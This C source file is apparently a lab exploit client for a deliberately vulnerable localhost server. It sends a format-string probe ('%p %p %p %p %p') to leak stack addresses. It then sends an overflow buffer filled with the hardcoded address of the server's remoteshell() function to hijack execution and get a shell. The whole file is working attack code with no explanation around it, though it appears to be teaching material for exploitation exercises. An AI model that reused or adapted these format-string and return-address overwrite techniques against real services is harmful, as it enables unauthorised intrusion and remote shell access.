/*
 * Simple demonstration of talking to our vulnerable server
 */
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <stdio.h>
#include <errno.h>
#include <netdb.h>
#include <time.h>

#define	PORTNUM	8001
#define	BLENGTH	256

static char shellcode[] =
"\x08\x04\x89\x94";

/* Send our name to the server */
static void
send_name(int s)
{
  char buffer[BLENGTH];
  char response_buffer[] = "%p %p %p %p %p";

  /* Receive a prompt from the server */
  recv(s, (void *)buffer, BLENGTH, MSG_WAITALL);

  /* Display the prompt to the user */
  fputs(buffer, stdout);

  /* Read a response from the user */
  //fgets(buffer, BLENGTH, stdin);
  
  /* Send the response to the server */
  send(s, (void *)response_buffer, BLENGTH, 0);

  /* Receive a reply from the server */
  recv(s, (void *)response_buffer, BLENGTH, MSG_WAITALL);

  /* Display the reply to the user */
  fputs(response_buffer, stdout);
}

/* Send our message to the server */
static void
send_message(int s)
{
	char buffer[BLENGTH];
	char response_buffer[BLENGTH];
	int numints = 140;
	int dummy_addr = 134515092; // integer value of 0x8048994 which is the location of the function dummy()
        int reverseshell_addr = 134515320; // integer value of 0x80489a8 which is the location of the function remoteshell()

	char *buff, *ptr;
	long *addr_ptr, addr;
	int i;
	
	addr = reverseshell_addr;
	printf("Using address: 0x%x\n", addr);
	
	ptr = response_buffer;
	addr_ptr = (long *) ptr;
	for (i = 0; i < numints; i+=4)
	*(addr_ptr++) = addr;
		
	ptr += 4;  
	for (i = 0; i < strlen(shellcode); i++)
	*(ptr++) = shellcode[i];
	
	response_buffer[numints - 1] = '\0';
	
	memcpy(response_buffer,"EGG=",4);

  /* Receive a prompt from the server */
  recv(s, (void *)buffer, BLENGTH, MSG_WAITALL);

  /* Display the prompt to the user */
  fputs(buffer, stdout);

  /* Read a response from the user */
  //fgets(buffer, BLENGTH, stdin);

  /* Send the response to the server */
  send(s, (void *)response_buffer, BLENGTH, 0);
}

/* Connect and talk to the server */
int
main()
{
  struct sockaddr_in server;
  struct hostent *host;
  int s;

  /* Create an Internet family, stream socket */
  s = socket(AF_INET, SOCK_STREAM, 0);

  /* Did that work? */
  if (s < 0) {
    perror("socket()");
    exit(EXIT_FAILURE);
  }

  /* We are running the server on localhost for the minute */
  if ((host = gethostbyname("localhost")) == NULL) {
    perror("gethostbyname()");
    exit(EXIT_FAILURE);
  }

  /* Fill in the socket address structure */
  memset((char *)&server, '\0', sizeof (server));
  server.sin_family = AF_INET;
  server.sin_port = htons(PORTNUM);
  memcpy((char *)&server.sin_addr, host->h_addr_list[0], host->h_length);

  /* Connect to the server */
  if (connect(s, (struct sockaddr *)&server, sizeof (server)) < 0) {
    perror("connect()");
    exit(EXIT_FAILURE);
  }

  /* Send our name first */
  send_name(s);

  /* Now send a message */
  send_message(s);

  /* Close the socket */
  close(s);

  return (0);
}
